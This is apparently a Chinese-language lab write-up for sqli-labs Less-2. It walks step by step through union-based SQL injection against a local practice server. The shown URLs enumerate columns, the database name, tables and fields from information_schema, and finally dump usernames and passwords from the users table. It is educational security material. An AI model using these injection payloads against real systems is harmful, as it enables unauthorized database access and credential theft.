<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326294358.png" alt="1584326294358"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326314334.png" alt="1584326314334"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看当前可以注入点</span><br><span class="line">发现注入点是2和3，在2或者3的位置进行注入</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326400032.png" alt="1584326400032"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库，我们在2的位置注入，当前库名是security</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,database(),3</span><br></pre></td></tr></table></figure>



<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326630219.png" alt="1584326630219"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们查看了当前security库里的库名，有emails，referers，uagents，users</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326766084.png" alt="1584326766084"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大部分情况下users是存放用户信息的，我们查看一下是否存放着用户信息，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;</span><br><span class="line">发现当前库名中有这些字段，发现有id，password，username，这三个字段，这正是我们需要的字段</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326923755.png" alt="1584326923755"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询这三个字段的数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,group_concat(id,username,password),3 from users</span><br><span class="line">查出了当前三个表的内容</span><br></pre></td></tr></table></figure>
